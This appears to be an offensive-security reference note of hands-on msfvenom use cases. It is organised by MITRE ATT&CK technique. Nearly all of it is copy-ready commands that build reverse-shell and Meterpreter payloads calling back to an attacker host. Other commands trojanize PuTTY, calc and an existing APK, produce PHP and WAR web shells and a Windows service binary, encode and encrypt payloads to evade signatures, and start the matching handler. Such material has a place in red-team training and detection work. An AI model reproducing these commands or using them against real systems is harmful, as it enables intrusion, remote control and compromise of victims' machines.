# Metasploit — msfvenom — Hands-On Use Cases

Every command below generates a payload **locally** — msfvenom never touches a target. Delivery (how the file reaches the victim) and execution (how it gets run there) are separate steps outside msfvenom's scope, covered where relevant in `../Meterpreter/02 - Hands-On Use Cases.md` and, briefly, LOLBins-style execution chains (full LOLBins coverage isn't built yet). MITRE ATT&CK ID(s) are tagged per scenario — msfvenom's own act of building a payload maps overwhelmingly to **T1587.001** (Develop Capabilities: Malware), with more specific tags layered on where a scenario adds encoding, injection, or a specific delivery shape.

## Contents
- [Enumerating Payloads, Encoders, and Formats Before Building](#enumerating-payloads-encoders-and-formats-before-building)
- [Basic Single Reverse-Shell Executable](#basic-single-reverse-shell-executable)
- [Staged Meterpreter for Reliable Egress](#staged-meterpreter-for-reliable-egress)
- [Stageless Meterpreter for Constrained or One-Shot Egress](#stageless-meterpreter-for-constrained-or-one-shot-egress)
- [HTTPS Meterpreter for Egress Through Inspected or Proxied Networks](#https-meterpreter-for-egress-through-inspected-or-proxied-networks)
- [Windows DLL Payload for Sideloading](#windows-dll-payload-for-sideloading)
- [Linux ELF Payload for Cross-Platform Targets](#linux-elf-payload-for-cross-platform-targets)
- [macOS Mach-O Payload](#macos-mach-o-payload)
- [Android APK Payload](#android-apk-payload)
- [PHP Web Shell for a Vulnerable Web Application](#php-web-shell-for-a-vulnerable-web-application)
- [Java WAR/JSP Payload for a Java Application Server](#java-warjsp-payload-for-a-java-application-server)
- [Encoding for Basic Static-Signature Obfuscation](#encoding-for-basic-static-signature-obfuscation)
- [Bad-Character Avoidance for Exploit Development](#bad-character-avoidance-for-exploit-development)
- [Reformatting Externally-Sourced Shellcode via Stdin](#reformatting-externally-sourced-shellcode-via-stdin)
- [Template Injection into a Legitimate Executable](#template-injection-into-a-legitimate-executable)
- [Raw Shellcode Output for a Custom Loader](#raw-shellcode-output-for-a-custom-loader)
- [Source-Code Format Output for LOLBin-Style Delivery](#source-code-format-output-for-lolbin-style-delivery)
- [Payload Size Minimization](#payload-size-minimization)
- [Windows Service-Binary Payload](#windows-service-binary-payload)
- [Encrypting Shellcode for a Custom Decrypting Loader](#encrypting-shellcode-for-a-custom-decrypting-loader)
- [Chaining Multiple Encoding Passes](#chaining-multiple-encoding-passes)
- [Pairing Output with a multi/handler Listener](#pairing-output-with-a-multihandler-listener)

---

## Enumerating Payloads, Encoders, and Formats Before Building

No MITRE ATT&CK mapping — this is local reconnaissance of the tool's own module tree, not an action against a target.

```bash
# Every payload module msfvenom can generate, by platform/arch/name
msfvenom -l payloads

# Every registered encoder
msfvenom -l encoders

# Every -f value msfvenom accepts, pulled live from the running install
# (the authoritative version of this note's Output Format Reference table)
msfvenom -l formats

# Supported target platforms / architectures
msfvenom -l platforms
msfvenom -l archs

# Once a payload is chosen: its full standard/advanced/evasion option set,
# equivalent to `show options` on the same module inside msfconsole
msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options
```
Every scenario below assumes the operator already knows the exact payload/encoder/format string to type — in practice that string usually comes from one of these listing commands first, especially `--list-options`, which surfaces module-specific datastore options beyond just `LHOST`/`LPORT` (e.g. a stager's `StagerRetryCount`, or a payload-specific `ReverseListenerBindAddress`) that aren't documented anywhere in this note's switches table since they belong to the payload module, not to msfvenom itself.

## Basic Single Reverse-Shell Executable

**MITRE ATT&CK:** [T1587.001](https://attack.mitre.org/techniques/T1587/001/) (Develop Capabilities: Malware)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o shell.exe
```
A **single** payload (underscore-joined, no `/` in the payload path) — fully self-contained, no second-stage download, no Meterpreter feature set. The simplest possible use of the tool: one payload, one format, one output file.

## Staged Meterpreter for Reliable Egress

**MITRE ATT&CK:** T1587.001 · [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer, for the stage1 download that occurs once this file runs)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o update.exe
```
Slash-joined payload path — a small stager ships in `update.exe`; the full `metsrv.dll` is pulled down over the connection once the handler catches the callback. Smaller file on disk, but depends on the second-stage transfer completing — see `../Meterpreter/01 - Overview.md`'s How It Works diagram for exactly what happens after this file executes.

## Stageless Meterpreter for Constrained or One-Shot Egress

**MITRE ATT&CK:** T1587.001

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o update.exe
```
Same payload family, underscore-joined instead of slash-joined — the entire Meterpreter DLL ships inside this one file. Chosen when the environment won't reliably support a second outbound connection (aggressive egress filtering) or the delivery mechanism only gets one execution attempt. Larger file, but no staging network dependency. This is the exact command referenced by `../Meterpreter/02 - Hands-On Use Cases.md`'s "Stageless Payload for Constrained Egress" scenario.

## HTTPS Meterpreter for Egress Through Inspected or Proxied Networks

**MITRE ATT&CK:** T1587.001 · [T1071.001](https://attack.mitre.org/techniques/T1071/001/) (Application Layer Protocol: Web Protocols)

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.1 LPORT=443 -f exe -o update.exe
```
Same payload family as `reverse_tcp`, wrapped in HTTPS instead of a raw TCP socket. Chosen specifically when the target network enforces egress filtering that only permits standard web ports/protocols, or routes traffic through a proxy that a raw TCP callback can't traverse — the tradeoff is a larger, more fingerprintable TLS handshake (self-signed-certificate and JA3/JA3S detail covered in `../Meterpreter/04 - Target Evidence.md` and `../Meterpreter/05 - Detection and Hunting.md`) in exchange for blending into normal outbound HTTPS traffic patterns at the network-perimeter level.

## Windows DLL Payload for Sideloading

**MITRE ATT&CK:** T1587.001 · [T1574.002](https://attack.mitre.org/techniques/T1574/002/) (Hijack Execution Flow: DLL Side-Loading, if the resulting DLL is placed for a vulnerable loader to pick up)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f dll -o update.dll
```
Same payload, `-f dll` instead of `-f exe`. What happens to this DLL next (planted next to a vulnerable signed binary for side-loading, loaded via `rundll32`, or manually loaded by another tool) is outside msfvenom's scope — it only builds the container.

## Linux ELF Payload for Cross-Platform Targets

**MITRE ATT&CK:** T1587.001

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf -o update.elf
```
`--platform linux -a x64` is implied by the `linux/x64/...` payload path itself; `-f elf` (or `elf-so` for a shared-object variant) is the corresponding Linux container format from `Msf::Util::EXE.to_executable_fmt_formats`.

## macOS Mach-O Payload

**MITRE ATT&CK:** T1587.001

```bash
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f macho -o update
```
`macho` is a real, distinct entry in msfvenom's executable-format list (verified against the current `lib/msf/util/exe.rb` source) — not an alias of `elf` or `exe`.

## Android APK Payload

**MITRE ATT&CK:** T1587.001

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f raw -o update.apk
```
**Accuracy note, verified against the official Framework payload documentation for `android/meterpreter/reverse_tcp`:** there is **no `apk` entry in msfvenom's format list.** The Android Meterpreter payload module generates complete, valid APK bytes itself; msfvenom is told `-f raw` (the same "just give me the bytes" format used for shellcode) and the operator supplies the `.apk` extension via `-o`. Many public cheat sheets list `apk` as if it were a first-class `-f` value — it isn't, and `-f apk` will fail.

To backdoor an **existing** APK instead of using the Framework's minimal template:
```bash
msfvenom -p android/meterpreter/reverse_tcp -x /path/to/existing.apk LHOST=10.10.14.1 LPORT=4444 -f raw -o trojanized.apk
```

## PHP Web Shell for a Vulnerable Web Application

**MITRE ATT&CK:** T1587.001 · [T1505.003](https://attack.mitre.org/techniques/T1505/003/) (Server Software Component: Web Shell, once the file is dropped and reachable on a web server)

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f raw -o shell.php
```
Same pattern as the Android case above: PHP is a scripting language, not an executable container, so there is no dedicated `php` entry in the format list either — `-f raw` emits the PHP source itself, and `-o shell.php` supplies the extension. Delivery is typically via a file-upload vulnerability, an exposed web-admin panel, or an LFI/RFI flaw in the target web application; once the `.php` file is reachable and requested over HTTP, the web server's PHP interpreter executes it and the Meterpreter stager calls back. Because it's plain PHP source rather than a compiled binary, this payload has no PE/ELF structure, no compile timestamp, and none of the entropy-contrast signature described in this note's red-flag callout — its evidence trail lives in the web server's own filesystem and access logs (see `04 - Target Evidence.md`), not in Windows-style execution artifacts.

## Java WAR/JSP Payload for a Java Application Server

**MITRE ATT&CK:** T1587.001 · T1505.003 (Server Software Component: Web Shell) · [T1078](https://attack.mitre.org/techniques/T1078/) (Valid Accounts, if delivery is via an exposed admin console authenticated with default/weak credentials)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f war -o shell.war
```
`-f war` packages the payload as a Java Web Application Archive containing a JSP page, built for deployment to a servlet container (Apache Tomcat, JBoss/WildFly). The canonical delivery path is an exposed, weakly-credentialed **Tomcat Manager** application: an authenticated operator (or one who guessed/reused default `manager-gui`/`manager-script` credentials) uploads the WAR directly through Tomcat's own deployment interface, at which point the container auto-explodes the archive into its webapps directory and the JSP executes on first request. `-f jsp` produces the bare JSP page alone, for environments where a raw JSP file (not a full WAR) can be dropped directly into an existing web root.

## Encoding for Basic Static-Signature Obfuscation

**MITRE ATT&CK:** [T1027](https://attack.mitre.org/techniques/T1027/) (Obfuscated Files or Information)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o update.exe
```
`shikata_ga_nai` is a polymorphic XOR-additive-feedback encoder — each encoding pass produces a different byte pattern for the same underlying payload. Consistent with `../Meterpreter/05 - Detection and Hunting.md`'s treatment of the same point: this is a **static-signature** evasion technique only. Rapid7's own documentation states plainly that encoding "isn't really meant to be used a real AV evasion solution," and by the current threat landscape, `shikata_ga_nai`-class decoder stubs are themselves signatured by modern AV/EDR — don't present `-i` iteration count as a meaningful evasion dial in write-ups. For the encoder's own internals (why the polymorphic engine still produces a recognizable decoder-stub shape, what other encoders exist, and real AV-evasion tradecraft beyond encoding alone), see `../Encoders and Evasion/`.

## Bad-Character Avoidance for Exploit Development

**MITRE ATT&CK:** T1587.001 (this scenario is exploit-development tooling, not obfuscation — no T1027 tag)

```bash
msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -b '\x00\x0a\x0d' -f c
```
`-b` is a constraint for shellcode that has to survive a vulnerable parser/buffer (e.g. null bytes terminating a C string, `\x0a`/`\x0d` breaking a line-oriented protocol) — msfvenom automatically selects a compatible encoder to guarantee the listed bytes never appear in the output. This is exploit-development plumbing, distinct in intent from the AV-evasion-flavored encoding scenario above even though both use the `-e` encoder subsystem under the hood.

## Reformatting Externally-Sourced Shellcode via Stdin

**MITRE ATT&CK:** T1027 (if the intent is re-wrapping/obfuscating shellcode obtained elsewhere)

```bash
cat custom_shellcode.bin | msfvenom -p - -a x64 --platform windows -e x86/shikata_ga_nai -i 3 -f exe -o wrapped.exe
```
`-p -` (equivalently `-p stdin`) tells msfvenom the payload bytes are coming from stdin rather than a Framework module — this is how an operator wraps hand-written shellcode, output from a separate exploit-development toolchain, or another framework's payload in msfvenom's own encoding/templating/formatting pipeline. Because there's no module to read architecture and platform from, **`-a`/`--platform` must be supplied explicitly** or generation fails; msfvenom gives itself up to 30 seconds by default to read from stdin (`-t`/`--timeout` to change that, `0` to disable the limit entirely).

## Template Injection into a Legitimate Executable

**MITRE ATT&CK:** T1587.001 · [T1027.002](https://attack.mitre.org/techniques/T1027/002/) (Obfuscated Files or Information: Software Packing, closest official mapping for template-wrapped payloads) · [T1204.002](https://attack.mitre.org/techniques/T1204/002/) (User Execution: Malicious File, once delivered)

```bash
# x86 template — payload overwrites the entry point (default)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -x putty.exe -k -f exe -o putty_trojan.exe

# x64 template — official docs require -f exe-only here, NOT -f exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -x 64_calc.exe -f exe-only -o calc_trojan.exe
```
`-x` swaps the Framework's default `msf/data/templates/` file for an operator-supplied one; `-k` additionally preserves the template's original behavior by running the payload as a **new thread** instead of overwriting the entry point, so a user who double-clicks `putty_trojan.exe` still gets a working PuTTY. Per Rapid7's own how-to guide, `-k`'s thread-injection approach is "only reliable for older Windows machines such as x86 Windows XP" — don't overstate its reliability against a modern Windows target.

## Raw Shellcode Output for a Custom Loader

**MITRE ATT&CK:** T1587.001

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f raw -o payload.bin
```
`raw` is a **transform format** (`Msf::Simple::Buffer.transform_formats`), not an executable container — the output is naked shellcode bytes meant to be embedded in a separately-written loader (a custom C/C#/Rust program doing its own `VirtualAlloc`/`CreateThread`, for instance) rather than run directly. This is the standard hand-off point when the operator wants to build their own loader/injector rather than use one of msfvenom's built-in output containers.

## Source-Code Format Output for LOLBin-Style Delivery

**MITRE ATT&CK:** T1587.001 · T1027 (if the intent is signature evasion via a non-executable delivery vector)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f csharp -v shellcode
```
`-f csharp` (or `c`, `python`, `powershell`, `go`, `rust`, `nim`, etc. — all real entries in `transform_formats`) emits the payload as a source-code byte array under the variable name given by `-v`, ready to paste into a loader written in that language — including, in real-world tradecraft, a loader compiled and executed via a signed LOLBin such as `MSBuild.exe` from an inline XML task. Full MSBuild/LOLBin execution-chain coverage lives in the planned `LOLBins/msbuild/` sub-module (not yet built) — mentioned here only as the reason this output format exists.

## Payload Size Minimization

**MITRE ATT&CK:** T1587.001

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 --smallest -f exe -o update.exe
```
`--smallest` tries every compatible encoder and keeps whichever produces the smallest result — a size optimization for constrained delivery paths (e.g. an exploit's limited buffer space via `-s`/`--encoder-space`), not an evasion technique.

## Windows Service-Binary Payload

**MITRE ATT&CK:** T1587.001 · [T1543.003](https://attack.mitre.org/techniques/T1543/003/) (Create or Modify System Process: Windows Service, for how the resulting binary is intended to run)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 --service-name UpdateSvc -f exe-service -o svc.exe
```
`-f exe-service` builds a binary that implements the Windows Service Control API expectations so it can be installed and started as a service; `--service-name` sets the name baked into that binary. This is the payload shape that feeds a service-based execution tool (e.g. `sc.exe create`, or chained after credential access into something like Impacket's `psexec.py` — see `../../Impacket/psexec/02 - Hands-On Use Cases.md` for that side of the chain).

## Encrypting Shellcode for a Custom Decrypting Loader

**MITRE ATT&CK:** T1027 · [T1140](https://attack.mitre.org/techniques/T1140/) (Deobfuscate/Decode Files or Information, for the loader-side decryption step)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 --encrypt aes256 --encrypt-key 000102030405060708090a0b0c0d0e0f --encrypt-iv 00112233445566778899aabbccddeeff -f raw -o payload.enc
```
`--encrypt` is a **cipher**, not msfvenom's decoder-stub-style encoding — the output is genuinely encrypted shellcode with no self-contained decoder, so a custom loader on the receiving end has to implement the matching decryption before it can execute the payload. This is a meaningfully different evasion posture than `-e`/`-i` encoding: an encoded payload is fully self-decoding and runnable on its own; encrypted output is inert bytes until paired with external loader code (see `--list encrypt` for the current cipher set).

## Chaining Multiple Encoding Passes

**MITRE ATT&CK:** T1027

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | \
msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
```
Piping `raw` output from one msfvenom invocation into the next, re-encoding with a different encoder each time, is the direct successor to the old `msfpayload | msfencode` chaining workflow (still explicitly documented and supported). Layers multiple decoder stubs — same static-signature-only caveat as the single-encoder scenario above applies at every layer.

## Pairing Output with a multi/handler Listener

**MITRE ATT&CK:** [T1071.001](https://attack.mitre.org/techniques/T1071/001/) (Application Layer Protocol: Web Protocols, if `reverse_https`) — this step is the handler side, not generation, so no T1587.001 tag applies here

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.1
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j -z
```
The `PAYLOAD`, `LHOST`, and `LPORT` values here must exactly match what was baked into the msfvenom-generated file — a mismatch means the callback either never connects or connects to the wrong handler configuration. Full handler mechanics and session establishment are covered in `../Meterpreter/02 - Hands-On Use Cases.md`'s "Initial Staged Shell via an Exploit Handler," not re-derived here since msfvenom's role ends the moment the file is written to disk.
